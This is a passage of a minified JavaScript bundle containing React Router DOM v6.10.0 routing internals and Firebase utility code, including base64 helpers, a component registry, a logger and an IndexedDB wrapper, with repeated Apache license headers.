r&&(r=Xr(r));let{pathname:u="/",search:c="",hash:h="",state:d=null,key:f="default"}=r,p=$.useMemo((()=>{let e=Eu(u,a);return null==e?null:{location:{pathname:e,search:c,hash:h,state:d,key:f},navigationType:i}}),[a,u,c,h,d,f,i]);return null==p?null:$.createElement(Tu.Provider,{value:l},$.createElement(kd.Provider,{children:n,value:p}))}function $b(e){let{children:t,location:n}=e,r=$.useContext(_y);return xb(r&&!t?r.router.routes:Rm(t),n)}function Rm(e,t){void 0===t&&(t=[]);let n=[];return $.Children.forEach(e,((e,r)=>{if(!$.isValidElement(e))return;let i=[...t,r];if(e.type===$.Fragment)return void n.push.apply(n,Rm(e.props.children,i));e.type!==Ob&&de(!1),!e.props.index||!e.props.children||de(!1);let s={id:e.props.id||i.join("-"),caseSensitive:e.props.caseSensitive,element:e.props.element,Component:e.props.Component,index:e.props.index,path:e.props.path,loader:e.props.loader,action:e.props.action,errorElement:e.props.errorElement,ErrorBoundary:e.props.ErrorBoundary,hasErrorBoundary:null!=e.props.ErrorBoundary||null!=e.props.errorElement,shouldRevalidate:e.props.shouldRevalidate,handle:e.props.handle,lazy:e.props.lazy};e.props.children&&(s.children=Rm(e.props.children,i)),n.push(s)})),n}function Lb(e){return!!e.ErrorBoundary||!!e.errorElement}
/**
 * React Router DOM v6.10.0
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function Oh(){return(Oh=Object.assign?Object.assign.bind():function(e){for(var t=1;t<arguments.length;t++){var n=arguments[t];for(var r in n)Object.prototype.hasOwnProperty.call(n,r)&&(e[r]=n[r])}return e}).apply(this,arguments)}function Fb(e,t){if(null==e)return{};var n,r,i={},s=Object.keys(e);for(r=0;r<s.length;r++)n=s[r],!(t.indexOf(n)>=0)&&(i[n]=e[n]);return i}function Vb(e){return!!(e.metaKey||e.altKey||e.ctrlKey||e.shiftKey)}function Ub(e,t){return!(0!==e.button||t&&"_self"!==t||Vb(e))}!function(e){e.UseBlocker="useBlocker",e.UseRevalidator="useRevalidator"}(lw||(lw={})),function(e){e.UseBlocker="useBlocker",e.UseLoaderData="useLoaderData",e.UseActionData="useActionData",e.UseRouteError="useRouteError",e.UseNavigation="useNavigation",e.UseRouteLoaderData="useRouteLoaderData",e.UseMatches="useMatches",e.UseRevalidator="useRevalidator"}(bh||(bh={})),function(e){e[e.pending=0]="pending",e[e.success=1]="success",e[e.error=2]="error"}(uw||(uw={})),new Promise((()=>{}));const zb=["onClick","relative","reloadDocument","replace","state","target","to","preventScrollReset"];function Bb(e,t){return tb({basename:null==t?void 0:t.basename,future:null==t?void 0:t.future,history:TA({window:null==t?void 0:t.window}),hydrationData:(null==t?void 0:t.hydrationData)||jb(),routes:e,detectErrorBoundary:Lb}).initialize()}function jb(){var e;let t=null==(e=window)?void 0:e.__staticRouterHydrationData;return t&&t.errors&&(t=Oh({},t,{errors:qb(t.errors)})),t}function qb(e){if(!e)return null;let t=Object.entries(e),n={};for(let[e,r]of t)if(r&&"RouteErrorResponse"===r.__type)n[e]=new Sy(r.status,r.statusText,r.data,!0===r.internal);else if(r&&"Error"===r.__type){let t=new Error(r.message);t.stack="",n[e]=t}else n[e]=r;return n}const Yb=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u",Wb=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,Gb=$.forwardRef((function(e,t){let n,{onClick:r,relative:i,reloadDocument:s,replace:o,state:a,target:l,to:u,preventScrollReset:c}=e,h=Fb(e,zb),{basename:d}=$.useContext(Tu),f=!1;if("string"==typeof u&&Wb.test(u)&&(n=u,Yb)){let e=new URL(window.location.href),t=u.startsWith("//")?new URL(e.protocol+u):new URL(u),n=Eu(t.pathname,d);t.origin===e.origin&&null!=n?u=n+t.search+t.hash:f=!0}let p=Eb(u,{relative:i}),m=Hb(u,{replace:o,state:a,target:l,preventScrollReset:c,relative:i});return $.createElement("a",Oh({},h,{href:n||p,onClick:f||s?r:function(e){r&&r(e),e.defaultPrevented||m(e)},ref:t,target:l}))}));var cw,hw;function Hb(e,t){let{target:n,replace:r,state:i,preventScrollReset:s,relative:o}=void 0===t?{}:t,a=Tb(),l=Dd(),u=I2(e,{relative:o});return $.useCallback((t=>{if(Ub(t,n)){t.preventDefault();let n=void 0!==r?r:Gr(l)===Gr(u);a(e,{replace:n,state:i,preventScrollReset:s,relative:o})}}),[l,a,u,r,i,n,e,s,o])}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */!function(e){e.UseScrollRestoration="useScrollRestoration",e.UseSubmitImpl="useSubmitImpl",e.UseFetcher="useFetcher"}(cw||(cw={})),function(e){e.UseFetchers="useFetchers",e.UseScrollRestoration="useScrollRestoration"}(hw||(hw={}));const k2=function(e){const t=[];let n=0;for(let r=0;r<e.length;r++){let i=e.charCodeAt(r);i<128?t[n++]=i:i<2048?(t[n++]=i>>6|192,t[n++]=63&i|128):55296==(64512&i)&&r+1<e.length&&56320==(64512&e.charCodeAt(r+1))?(i=65536+((1023&i)<<10)+(1023&e.charCodeAt(++r)),t[n++]=i>>18|240,t[n++]=i>>12&63|128,t[n++]=i>>6&63|128,t[n++]=63&i|128):(t[n++]=i>>12|224,t[n++]=i>>6&63|128,t[n++]=63&i|128)}return t},Kb=function(e){const t=[];let n=0,r=0;for(;n<e.length;){const i=e[n++];if(i<128)t[r++]=String.fromCharCode(i);else if(i>191&&i<224){const s=e[n++];t[r++]=String.fromCharCode((31&i)<<6|63&s)}else if(i>239&&i<365){const s=((7&i)<<18|(63&e[n++])<<12|(63&e[n++])<<6|63&e[n++])-65536;t[r++]=String.fromCharCode(55296+(s>>10)),t[r++]=String.fromCharCode(56320+(1023&s))}else{const s=e[n++],o=e[n++];t[r++]=String.fromCharCode((15&i)<<12|(63&s)<<6|63&o)}}return t.join("")},D2={byteToCharMap_:null,charToByteMap_:null,byteToCharMapWebSafe_:null,charToByteMapWebSafe_:null,ENCODED_VALS_BASE:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",get ENCODED_VALS(){return this.ENCODED_VALS_BASE+"+/="},get ENCODED_VALS_WEBSAFE(){return this.ENCODED_VALS_BASE+"-_."},HAS_NATIVE_SUPPORT:"function"==typeof atob,encodeByteArray(e,t){if(!Array.isArray(e))throw Error("encodeByteArray takes an array as a parameter");this.init_();const n=t?this.byteToCharMapWebSafe_:this.byteToCharMap_,r=[];for(let t=0;t<e.length;t+=3){const i=e[t],s=t+1<e.length,o=s?e[t+1]:0,a=t+2<e.length,l=a?e[t+2]:0,u=i>>2,c=(3&i)<<4|o>>4;let h=(15&o)<<2|l>>6,d=63&l;a||(d=64,s||(h=64)),r.push(n[u],n[c],n[h],n[d])}return r.join("")},encodeString(e,t){return this.HAS_NATIVE_SUPPORT&&!t?btoa(e):this.encodeByteArray(k2(e),t)},decodeString(e,t){return this.HAS_NATIVE_SUPPORT&&!t?atob(e):Kb(this.decodeStringToByteArray(e,t))},decodeStringToByteArray(e,t){this.init_();const n=t?this.charToByteMapWebSafe_:this.charToByteMap_,r=[];for(let t=0;t<e.length;){const i=n[e.charAt(t++)],s=t<e.length?n[e.charAt(t)]:0;++t;const o=t<e.length?n[e.charAt(t)]:64;++t;const a=t<e.length?n[e.charAt(t)]:64;if(++t,null==i||null==s||null==o||null==a)throw new Qb;const l=i<<2|s>>4;if(r.push(l),64!==o){const e=s<<4&240|o>>2;if(r.push(e),64!==a){const e=o<<6&192|a;r.push(e)}}}return r},init_(){if(!this.byteToCharMap_){this.byteToCharMap_={},this.charToByteMap_={},this.byteToCharMapWebSafe_={},this.charToByteMapWebSafe_={};for(let e=0;e<this.ENCODED_VALS.length;e++)this.byteToCharMap_[e]=this.ENCODED_VALS.charAt(e),this.charToByteMap_[this.byteToCharMap_[e]]=e,this.byteToCharMapWebSafe_[e]=this.ENCODED_VALS_WEBSAFE.charAt(e),this.charToByteMapWebSafe_[this.byteToCharMapWebSafe_[e]]=e,e>=this.ENCODED_VALS_BASE.length&&(this.charToByteMap_[this.ENCODED_VALS_WEBSAFE.charAt(e)]=e,this.charToByteMapWebSafe_[this.ENCODED_VALS.charAt(e)]=e)}}};class Qb extends Error{constructor(){super(...arguments),this.name="DecodeBase64StringError"}}const Xb=function(e){const t=k2(e);return D2.encodeByteArray(t,!0)},Ph=function(e){return Xb(e).replace(/\./g,"")},Jb=function(e){try{return D2.decodeString(e,!0)}catch(e){console.error("base64Decode failed: ",e)}return null};function $h(e,t){if(!(t instanceof Object))return t;switch(t.constructor){case Date:return new Date(t.getTime());case Object:void 0===e&&(e={});break;case Array:e=[];break;default:return t}for(const n in t)!t.hasOwnProperty(n)||!Zb(n)||(e[n]=$h(e[n],t[n]));return e}function Zb(e){return"__proto__"!==e}
/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function eO(){if(typeof self<"u")return self;if(typeof window<"u")return window;if(typeof global<"u")return global;throw new Error("Unable to locate global object.")}
/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const tO=()=>eO().__FIREBASE_DEFAULTS__,nO=()=>{if(typeof process>"u"||typeof process.env>"u")return;const e={}.__FIREBASE_DEFAULTS__;return e?JSON.parse(e):void 0},rO=()=>{if(typeof document>"u")return;let e;try{e=document.cookie.match(/__FIREBASE_DEFAULTS__=([^;]+)/)}catch{return}const t=e&&Jb(e[1]);return t&&JSON.parse(t)},C2=()=>{try{return eO().__FIREBASE_DEFAULTS__||nO()||rO()}catch(e){return void console.info(`Unable to get __FIREBASE_DEFAULTS__ due to: ${e}`)}},iO=()=>{var e;return null===(e=C2())||void 0===e?void 0:e.config};
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class sO{constructor(){this.reject=()=>{},this.resolve=()=>{},this.promise=new Promise(((e,t)=>{this.resolve=e,this.reject=t}))}wrapCallback(e){return(t,n)=>{t?this.reject(t):this.resolve(n),"function"==typeof e&&(this.promise.catch((()=>{})),1===e.length?e(t):e(t,n))}}}
/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function oO(e,t){if(e.uid)throw new Error('The "uid" field is no longer supported by mockUserToken. Please use "sub" instead for Firebase Auth User ID.');const n=t||"demo-project",r=e.iat||0,i=e.sub||e.user_id;if(!i)throw new Error("mockUserToken must contain 'sub' or 'user_id' field!");const s=Object.assign({iss:`https://securetoken.google.com/${n}`,aud:n,iat:r,exp:r+3600,auth_time:r,sub:i,user_id:i,firebase:{sign_in_provider:"custom",identities:{}}},e);return[Ph(JSON.stringify({alg:"none",type:"JWT"})),Ph(JSON.stringify(s)),""].join(".")}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Am(){return typeof navigator<"u"&&"string"==typeof navigator.userAgent?navigator.userAgent:""}function aO(){var e;const t=null===(e=C2())||void 0===e?void 0:e.forceEnvironment;if("node"===t)return!0;if("browser"===t)return!1;try{return"[object process]"===Object.prototype.toString.call(global.process)}catch{return!1}}function lO(){return"object"==typeof self&&self.self===self}function uO(){return!aO()&&navigator.userAgent.includes("Safari")&&!navigator.userAgent.includes("Chrome")}function N2(){try{return"object"==typeof indexedDB}catch{return!1}}function cO(){return new Promise(((e,t)=>{try{let n=!0;const r="validate-browser-context-for-indexeddb-analytics-module",i=self.indexedDB.open(r);i.onsuccess=()=>{i.result.close(),n||self.indexedDB.deleteDatabase(r),e(!0)},i.onupgradeneeded=()=>{n=!1},i.onerror=()=>{var e;t((null===(e=i.error)||void 0===e?void 0:e.message)||"")}}catch(e){t(e)}}))}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const hO="FirebaseError";class Js extends Error{constructor(e,t,n){super(t),this.code=e,this.customData=n,this.name=hO,Object.setPrototypeOf(this,Js.prototype),Error.captureStackTrace&&Error.captureStackTrace(this,Cd.prototype.create)}}class Cd{constructor(e,t,n){this.service=e,this.serviceName=t,this.errors=n}create(e,...t){const n=t[0]||{},r=`${this.service}/${e}`,i=this.errors[e],s=i?dO(i,n):"Error",o=`${this.serviceName}: ${s} (${r}).`;return new Js(r,o,n)}}function dO(e,t){return e.replace(fO,((e,n)=>{const r=t[n];return null!=r?String(r):`<${n}?>`}))}const fO=/\{\$([^}]+)}/g;
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function dw(e,t){return Object.prototype.hasOwnProperty.call(e,t)}function bm(e,t){if(e===t)return!0;const n=Object.keys(e),r=Object.keys(t);for(const i of n){if(!r.includes(i))return!1;const n=e[i],s=t[i];if(fw(n)&&fw(s)){if(!bm(n,s))return!1}else if(n!==s)return!1}for(const e of r)if(!n.includes(e))return!1;return!0}function fw(e){return null!==e&&"object"==typeof e}function pO(e,t){const n=new mO(e,t);return n.subscribe.bind(n)}class mO{constructor(e,t){this.observers=[],this.unsubscribes=[],this.observerCount=0,this.task=Promise.resolve(),this.finalized=!1,this.onNoObservers=t,this.task.then((()=>{e(this)})).catch((e=>{this.error(e)}))}next(e){this.forEachObserver((t=>{t.next(e)}))}error(e){this.forEachObserver((t=>{t.error(e)})),this.close(e)}complete(){this.forEachObserver((e=>{e.complete()})),this.close()}subscribe(e,t,n){let r;if(void 0===e&&void 0===t&&void 0===n)throw new Error("Missing Observer.");r=gO(e,["next","error","complete"])?e:{next:e,error:t,complete:n},void 0===r.next&&(r.next=dp),void 0===r.error&&(r.error=dp),void 0===r.complete&&(r.complete=dp);const i=this.unsubscribeOne.bind(this,this.observers.length);return this.finalized&&this.task.then((()=>{try{this.finalError?r.error(this.finalError):r.complete()}catch{}})),this.observers.push(r),i}unsubscribeOne(e){void 0===this.observers||void 0===this.observers[e]||(delete this.observers[e],this.observerCount-=1,0===this.observerCount&&void 0!==this.onNoObservers&&this.onNoObservers(this))}forEachObserver(e){if(!this.finalized)for(let t=0;t<this.observers.length;t++)this.sendOne(t,e)}sendOne(e,t){this.task.then((()=>{if(void 0!==this.observers&&void 0!==this.observers[e])try{t(this.observers[e])}catch(e){typeof console<"u"&&console.error&&console.error(e)}}))}close(e){this.finalized||(this.finalized=!0,void 0!==e&&(this.finalError=e),this.task.then((()=>{this.observers=void 0,this.onNoObservers=void 0})))}}function gO(e,t){if("object"!=typeof e||null===e)return!1;for(const n of t)if(n in e&&"function"==typeof e[n])return!0;return!1}function dp(){}
/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Et(e){return e&&e._delegate?e._delegate:e}class Ls{constructor(e,t,n){this.name=e,this.instanceFactory=t,this.type=n,this.multipleInstances=!1,this.serviceProps={},this.instantiationMode="LAZY",this.onInstanceCreated=null}setInstantiationMode(e){return this.instantiationMode=e,this}setMultipleInstances(e){return this.multipleInstances=e,this}setServiceProps(e){return this.serviceProps=e,this}setInstanceCreatedCallback(e){return this.onInstanceCreated=e,this
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */}}const hs="[DEFAULT]";
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class yO{constructor(e,t){this.name=e,this.container=t,this.component=null,this.instances=new Map,this.instancesDeferred=new Map,this.instancesOptions=new Map,this.onInitCallbacks=new Map}get(e){const t=this.normalizeInstanceIdentifier(e);if(!this.instancesDeferred.has(t)){const e=new sO;if(this.instancesDeferred.set(t,e),this.isInitialized(t)||this.shouldAutoInitialize())try{const n=this.getOrInitializeService({instanceIdentifier:t});n&&e.resolve(n)}catch{}}return this.instancesDeferred.get(t).promise}getImmediate(e){var t;const n=this.normalizeInstanceIdentifier(null==e?void 0:e.identifier),r=null!==(t=null==e?void 0:e.optional)&&void 0!==t&&t;if(!this.isInitialized(n)&&!this.shouldAutoInitialize()){if(r)return null;throw Error(`Service ${this.name} is not available`)}try{return this.getOrInitializeService({instanceIdentifier:n})}catch(e){if(r)return null;throw e}}getComponent(){return this.component}setComponent(e){if(e.name!==this.name)throw Error(`Mismatching Component ${e.name} for Provider ${this.name}.`);if(this.component)throw Error(`Component for ${this.name} has already been provided`);if(this.component=e,this.shouldAutoInitialize()){if(wO(e))try{this.getOrInitializeService({instanceIdentifier:hs})}catch{}for(const[e,t]of this.instancesDeferred.entries()){const n=this.normalizeInstanceIdentifier(e);try{const e=this.getOrInitializeService({instanceIdentifier:n});t.resolve(e)}catch{}}}}clearInstance(e=hs){this.instancesDeferred.delete(e),this.instancesOptions.delete(e),this.instances.delete(e)}async delete(){const e=Array.from(this.instances.values());await Promise.all([...e.filter((e=>"INTERNAL"in e)).map((e=>e.INTERNAL.delete())),...e.filter((e=>"_delete"in e)).map((e=>e._delete()))])}isComponentSet(){return null!=this.component}isInitialized(e=hs){return this.instances.has(e)}getOptions(e=hs){return this.instancesOptions.get(e)||{}}initialize(e={}){const{options:t={}}=e,n=this.normalizeInstanceIdentifier(e.instanceIdentifier);if(this.isInitialized(n))throw Error(`${this.name}(${n}) has already been initialized`);if(!this.isComponentSet())throw Error(`Component ${this.name} has not been registered yet`);const r=this.getOrInitializeService({instanceIdentifier:n,options:t});for(const[e,t]of this.instancesDeferred.entries()){n===this.normalizeInstanceIdentifier(e)&&t.resolve(r)}return r}onInit(e,t){var n;const r=this.normalizeInstanceIdentifier(t),i=null!==(n=this.onInitCallbacks.get(r))&&void 0!==n?n:new Set;i.add(e),this.onInitCallbacks.set(r,i);const s=this.instances.get(r);return s&&e(s,r),()=>{i.delete(e)}}invokeOnInitCallbacks(e,t){const n=this.onInitCallbacks.get(t);if(n)for(const r of n)try{r(e,t)}catch{}}getOrInitializeService({instanceIdentifier:e,options:t={}}){let n=this.instances.get(e);if(!n&&this.component&&(n=this.component.instanceFactory(this.container,{instanceIdentifier:vO(e),options:t}),this.instances.set(e,n),this.instancesOptions.set(e,t),this.invokeOnInitCallbacks(n,e),this.component.onInstanceCreated))try{this.component.onInstanceCreated(this.container,e,n)}catch{}return n||null}normalizeInstanceIdentifier(e=hs){return this.component?this.component.multipleInstances?e:hs:e}shouldAutoInitialize(){return!!this.component&&"EXPLICIT"!==this.component.instantiationMode}}function vO(e){return e===hs?void 0:e}function wO(e){return"EAGER"===e.instantiationMode}
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class SO{constructor(e){this.name=e,this.providers=new Map}addComponent(e){const t=this.getProvider(e.name);if(t.isComponentSet())throw new Error(`Component ${e.name} has already been registered with ${this.name}`);t.setComponent(e)}addOrOverwriteComponent(e){this.getProvider(e.name).isComponentSet()&&this.providers.delete(e.name),this.addComponent(e)}getProvider(e){if(this.providers.has(e))return this.providers.get(e);const t=new yO(e,this);return this.providers.set(e,t),t}getProviders(){return Array.from(this.providers.values())}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Ty=[];var Ce;!function(e){e[e.DEBUG=0]="DEBUG",e[e.VERBOSE=1]="VERBOSE",e[e.INFO=2]="INFO",e[e.WARN=3]="WARN",e[e.ERROR=4]="ERROR",e[e.SILENT=5]="SILENT"}(Ce||(Ce={}));const M2={debug:Ce.DEBUG,verbose:Ce.VERBOSE,info:Ce.INFO,warn:Ce.WARN,error:Ce.ERROR,silent:Ce.SILENT},_O=Ce.INFO,EO={[Ce.DEBUG]:"log",[Ce.VERBOSE]:"log",[Ce.INFO]:"info",[Ce.WARN]:"warn",[Ce.ERROR]:"error"},TO=(e,t,...n)=>{if(t<e.logLevel)return;const r=(new Date).toISOString(),i=EO[t];if(!i)throw new Error(`Attempted to log a message with an invalid logType (value: ${t})`);console[i](`[${r}]  ${e.name}:`,...n)};class xy{constructor(e){this.name=e,this._logLevel=_O,this._logHandler=TO,this._userLogHandler=null,Ty.push(this)}get logLevel(){return this._logLevel}set logLevel(e){if(!(e in Ce))throw new TypeError(`Invalid value "${e}" assigned to \`logLevel\``);this._logLevel=e}setLogLevel(e){this._logLevel="string"==typeof e?M2[e]:e}get logHandler(){return this._logHandler}set logHandler(e){if("function"!=typeof e)throw new TypeError("Value assigned to `logHandler` must be a function");this._logHandler=e}get userLogHandler(){return this._userLogHandler}set userLogHandler(e){this._userLogHandler=e}debug(...e){this._userLogHandler&&this._userLogHandler(this,Ce.DEBUG,...e),this._logHandler(this,Ce.DEBUG,...e)}log(...e){this._userLogHandler&&this._userLogHandler(this,Ce.VERBOSE,...e),this._logHandler(this,Ce.VERBOSE,...e)}info(...e){this._userLogHandler&&this._userLogHandler(this,Ce.INFO,...e),this._logHandler(this,Ce.INFO,...e)}warn(...e){this._userLogHandler&&this._userLogHandler(this,Ce.WARN,...e),this._logHandler(this,Ce.WARN,...e)}error(...e){this._userLogHandler&&this._userLogHandler(this,Ce.ERROR,...e),this._logHandler(this,Ce.ERROR,...e)}}function xO(e){Ty.forEach((t=>{t.setLogLevel(e)}))}function IO(e,t){for(const n of Ty){let r=null;t&&t.level&&(r=M2[t.level]),n.userLogHandler=null===e?null:(t,n,...i)=>{const s=i.map((e=>{if(null==e)return null;if("string"==typeof e)return e;if("number"==typeof e||"boolean"==typeof e)return e.toString();if(e instanceof Error)return e.message;try{return JSON.stringify(e)}catch{return null}})).filter((e=>e)).join(" ");n>=(r??t.logLevel)&&e({level:Ce[n].toLowerCase(),message:s,args:i,type:t.name})}}}const kO=(e,t)=>t.some((t=>e instanceof t));let pw,mw;function DO(){return pw||(pw=[IDBDatabase,IDBObjectStore,IDBIndex,IDBCursor,IDBTransaction])}function CO(){return mw||(mw=[IDBCursor.prototype.advance,IDBCursor.prototype.continue,IDBCursor.prototype.continuePrimaryKey])}const R2=new WeakMap,Om=new WeakMap,A2=new WeakMap,fp=new WeakMap,Iy=new WeakMap;function NO(e){const t=new Promise(((t,n)=>{const r=()=>{e.removeEventListener("success",i),e.removeEventListener("error",s)},i=()=>{t(Ni(e.result)),r()},s=()=>{n(e.error),r()};e.addEventListener("success",i),e.addEventListener("error",s)}));return t.then((t=>{t instanceof IDBCursor&&R2.set(t,e)})).catch((()=>{})),Iy.set(t,e),t}function MO(e){if(Om.has(e))return;const t=new Promise(((t,n)=>{const r=()=>{e.removeEventListener("complete",i),e.removeEventListener("error",s),e.removeEventListener("abort",s)},i=()=>{t(),r()},s=()=>{n(e.error||new DOMException("AbortError","AbortError")),r()};e.addEventListener("complete",i),e.addEventListener("error",s),e.addEventListener("abort",s)}));Om.set(e,t)}let Pm={get(e,t,n){if(e instanceof IDBTransaction){if("done"===t)return Om.get(e);if("objectStoreNames"===t)return e.objectStoreNames||A2.get(e);if("store"===t)return n.objectStoreNames[1]?void 0:n.objectStore(n.objectStoreNames[0])}return Ni(e[t])},set:(e,t,n)=>(e[t]=n,!0),has:(e,t)=>e instanceof IDBTransaction&&("done"===t||"store"===t)||t in e};function RO(e){Pm=e(Pm)}function AO(e){return e!==IDBDatabase.prototype.transaction||"objectStoreNames"in IDBTransaction.prototype?CO().includes(e)?function(...t){return e.apply(pp(this),t),Ni(R2.get(this))}:function(...t){return Ni(e.apply(pp(this),t))}:function(t,...n){const r=e.call(pp(this),t,...n);return A2.set(r,t.sort?t.sort():[t]),Ni(r)}}function bO(e){return"function"==typeof e?AO(e):(e instanceof IDBTransaction&&MO(e),kO(e,DO())?new Proxy(e,Pm):e)}function Ni(e){if(e instanceof IDBRequest)return NO(e);if(fp.has(e))return fp.get(e);const t=bO(e);return t!==e&&(fp.set(e,t),Iy.set(t,e)),t}const pp=e=>Iy.get(e);function OO(e,t,{blocked:n,upgrade:r,blocking:i,terminated:s}={}){const o=indexedDB.open(e,t),a=Ni(o);return r&&o.addEventListener("upgradeneeded",(e=>{r(Ni(o.result),e.oldVersion,e.newVersion,Ni(o.transaction),e)})),n&&o.addEventListener("blocked",(e=>n(e.oldVersion,e.newVersion,e))),a.then((e=>{s&&e.addEventListener("close",(()=>s())),i&&e.addEventListener("versionchange",(e=>i(e.oldVersion,e.newVersion,e)))})).catch((()=>{})),a}const PO=["get","getKey","getAll","getAllKeys","count"],$O=["put","add","delete","clear"],mp=new Map;function gw(e,t){if(!(e instanceof IDBDatabase)||t in e||"string"!=typeof t)return;if(mp.get(t))return mp.get(t);const n=t.replace(/FromIndex$/,""),r=t!==n,i=$O.includes(n);if(!(n 